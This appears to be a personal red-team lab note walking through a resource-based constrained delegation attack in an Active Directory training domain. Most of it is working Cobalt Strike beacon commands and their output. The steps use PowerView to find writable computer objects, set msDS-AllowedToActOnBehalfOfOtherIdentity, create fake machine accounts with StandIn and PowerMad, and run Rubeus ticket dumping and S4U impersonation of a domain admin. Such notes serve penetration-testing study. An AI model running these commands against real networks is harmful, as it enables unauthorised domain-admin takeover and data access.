It's possible to gain code execution with elevated privileges on a remote computer if you have WRITE privilege on that computer's AD object.
## Overview
#ResourceBasedConstrainedDelegation
High level overview of the attack as performed in the lab:
- We have code execution on the box `WS02` in the context of `offense\sandy` user;
- User `sandy` has `WRITE` privilege over a target computer `WS01`;
- User `sandy` creates a new computer object `FAKE01` in Active Directory (no admin required);
- User `sandy` leverages the `WRITE` privilege on the `WS01` computer object and updates its object's attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` to enable the newly created computer `FAKE01` to impersonate and authenticate any domain user that can then access the target system `WS01`. In human terms this means that the target computer `WS01` is happy for the computer `FAKE01` to impersonate any domain user and give them any access (even Domain Admin privileges) to `WS01`;
- `WS01` trusts `FAKE01` due to the modified `msDS-AllowedToActOnBehalfOfOtherIdentity`;
- We request Kerberos tickets for `FAKE01$` with ability to impersonate `offense\spotless` who is a Domain Admin;
- Profit - we can now access the `c$` share of `ws01` from the computer `ws02`.

## Execute
```
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
```
![[Pasted image 20240917095421.png]]
A common means of obtaining a principal with an SPN is to use a computer account.  Since we have elevated privileges on Workstation 2, we can use that.  To start the attack, we need its SID.
```
beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid

objectsid                                   
---------                                   
S-1-5-21-569305411-121244042-2357301523-1109
```

Set the msDS-AllowedToActOnBehalfOfOtherIdentity in raw binary
```
powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
```
Another way is to:
```
Get-DomainComputer dc-2 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```
check
```
beacon> powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
Next, we use the WKSN-2$ account to perform the S4U impersonation with Rubeus.  The `s4u` command requires a TGT, RC4 or AES hash.  Since we already have elevated access to it, we can just extract its TGT from memory.
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

 | 0x3e4    | wkstn-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO                      | 9/13/2022 7:27:12 PM


beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=

steal_token
```


## Without local admin access, we can create a FAKE Computer
```
beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

ms-ds-machineaccountquota
-------------------------
                       10
```
[StandIn](https://github.com/FuzzySecurity/StandIn) is a post-ex toolkit written by [Ruben Boonen](https://twitter.com/FuzzySec) and has the functionality to create a computer with a random password.
```
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make

[?] Using DC    : dc-2.dev.cyberbotic.io
    |_ Domain   : dev.cyberbotic.io
    |_ DN       : CN=EvilComputer,CN=Computers,DC=dev,DC=cyberbotic,DC=io
    |_ Password : oIrpupAtF1YCXaw

[+] Machine account added to AD..

Get-DomainComputer EvilComputer
# computer SID: S-1-5-21-2552734371-813931464-1050690807-1154
```
PowerMad is another tool to create fake computers
```
import-module powermad
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'oIrpupAtF1YCXaw' -AsPlainText -Force) -Verbose


Get-DomainComputer fake01
# computer SID: S-1-5-21-2552734371-813931464-1050690807-1154
```

Get hashes of the fake computer 
```
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
...
[*]       aes256_cts_hmac_sha1 : 7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
...
```
ask tgt
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
```
And the rest is the same
Set msDS-AllowedToActOnBehalfOfOtherIdentity
Impersonate with s4u
create net only
steal token

